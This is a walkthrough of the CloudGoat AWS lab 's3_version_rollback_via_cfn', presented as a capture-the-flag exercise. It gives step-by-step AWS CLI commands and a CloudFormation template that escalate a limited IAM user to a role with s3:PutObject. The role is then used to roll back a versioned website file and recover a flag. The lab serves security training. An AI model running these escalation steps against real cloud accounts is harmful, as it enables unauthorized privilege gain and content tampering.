# CloudGoat Walkthrough: s3_version_rollback_via_cfn

1. Verify that the given website URL uses S3 static web hosting.

2. Configure your AWS CLI profile.

```sh
$ aws configure --profile {IAM User}
```

3. Check permissions.

```sh
$ sts get-caller-identity --profile {IAM User}
$ aws iam get-user --user-name {} --profile {IAM User}
	-> PermissionBoundary Discovery.
$ aws iam list-user-policies --user-name {} --profile {IAM User}
$ aws iam get-user-policy --user-name {} --policy-name {} --profile {IAM User}
	-> Check S3 query permissions, CloudFormation stack creation permissions, CreateRole, etc.
```

4. S3 object, check version and then try to download.

```sh
$ aws s3 ls s3://{} --profile {IAM User} 
		-> Verify bucket name by reporting website static address.

$ aws s3api list-object-versions \
 --bucket {} \
 --profile {IAM User}

$ aws s3api get-object \
  --bucket {} \
  --key {} \
  --version-id {}\
  ./{outfile} \
  --profile {IAM User}
```

5. After failing to download only Flag.txt with bucket policy, check the contents of previous version `index.html`.

```
$ cat {index.html}
    -> Check the previous version of index.html logic and see if it needs to be restored.
```

6. Check permissions to use Cloudformation after restore fails due to lack of putobject permission required to restore previous version.

```sh
$ aws iam get-policy --policy-arn {Boundary ARN} --profile {IAM User}

  -> In order to create a CreateRole in a Cloudformation policy, you must create a template by inserting a boundary policy.
```
```sh
$ aws iam get-policy-version \
  --policy-arn {Boundary ARN} \
  --version-id {Version Id} \
  --profile {IAM User}

  -> Boundary policy has PutObject permission allow check. PutObject permission can be granted with   CreateRole.
```

7. create a Cloudformation template yaml file. (with RoleName matching the resource in the cloudformation inline policy)

```yaml
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  ExploitRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: CloudFormationRole 
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: "arn:aws:iam::{identity}:user/{IAM user}"
            Action: sts:AssumeRole
            
      PermissionsBoundary: "arn:aws:iam::{identity}:policy/{Boundary Policy}"
           
      Policies:
        - PolicyName: {Desired policy name}
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - s3:PutObject
                Resource: "*"
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The RoleName of the policy must match and the PermissionsBoundary entry must be included. Additionally, even if you grant higher permissions due to the permission boundary, only putobject will work.

8. Create CloudFormation Stack.

```sh
$ aws cloudformation create-stack \
  --stack-name {} \
  --template-body file://{yaml file path} \
  --capabilities CAPABILITY_NAMED_IAM \
  --profile {IAM User}
```

9. Role Assume.

```sh
$ aws iam list-roles --profile {IAM User} 
	-> Check the Role arn generated by cloudformation.

$ aws sts assume-role \
  --role-arn arn:aws:iam::{}:role/{} \
  --role-session-name {} \
  --profile {IAM User}
```

10. Configure Assume user temporary credentials. (~/.aws/credentials)

```sh
[Assume]
aws_access_key_id = <AssumedAccessKeyId>
aws_secret_access_key = <AssumedSecretAccessKey>
aws_session_token = <SessionToken>
```

11. Restore a previous version.

```sh
$ aws s3api put-object \
  --bucket {} \
  --key index.html \
  --body ./{} \ 
  --content-type text/html \
  --profile {Assume}
```

12. After reconnecting to the web, restore and check the flag.

```
http://{}.s3-website-<region>.amazonaws.com/
```

## Conclusion

In this scenario, we:
1. **Identifying the vulnerability of the object lock + versioning combination.**
    ->Object locking works for single objects, but it doesn't work when combined with versioning. S3 versioning is the concept of stacking objects rather than overwriting them when PutObject is used.
2. **AWS Privilege Escalation** (privilege escalation) by creating a Cloudformation stack
    â†’ Escalate privileges by linking explicitly denied permissions to permission boundaries.

This walkthrough demonstrates a cloud security vulnerability involving S3 and permission boundaries, and shows how to create a role using a CloudFormation stack.